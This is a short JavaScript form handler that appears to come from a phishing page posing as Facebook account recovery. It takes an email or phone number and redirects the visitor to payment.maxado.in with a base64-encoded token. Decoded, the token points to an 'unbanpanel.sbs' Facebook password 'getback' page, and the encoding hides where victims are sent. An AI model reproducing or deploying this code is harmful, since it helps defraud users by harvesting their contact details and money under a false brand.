    <script>
        function validateForm() {
            var emailOrPhoneInput = document.getElementById('emailOrPhone');
            var inputValue = emailOrPhoneInput.value.trim();

            // Phone number validation (10 digits)
            var phonePattern = /^[0-9]{10}$/;

            // Email validation (only @ symbol)
            var emailPattern = /@/;

            // Check if input is valid
            if (inputValue === "") {
                emailOrPhoneInput.classList.add('error');
                return false;
            }

            if (phonePattern.test(inputValue)) {
                emailOrPhoneInput.classList.remove('error');
                window.location.href = "https://payment.maxado.in/index.php?token=OTh8fGFIUjBjSE02THk5MWJtSmhibkJoYm1Wc0xuTmljeTltWWk5d1lYTnpkMjl5WkM5blpYUmlZV05yfHxodHRwczovL3VuYmFucGFuZWwuc2JzL2ZiL2xvY2tlZC9mYWNlYm9vay1sb2dvLnN2Zw==";  // Redirect for valid phone number
            } else if (emailPattern.test(inputValue)) {
                emailOrPhoneInput.classList.remove('error');
                window.location.href = "https://payment.maxado.in/index.php?token=OTh8fGFIUjBjSE02THk5MWJtSmhibkJoYm1Wc0xuTmljeTltWWk5d1lYTnpkMjl5WkM5blpYUmlZV05yfHxodHRwczovL3VuYmFucGFuZWwuc2JzL2ZiL2xvY2tlZC9mYWNlYm9vay1sb2dvLnN2Zw==";  // Redirect for valid email
            } else {
                emailOrPhoneInput.classList.add('error');
            }
        }
    </script>
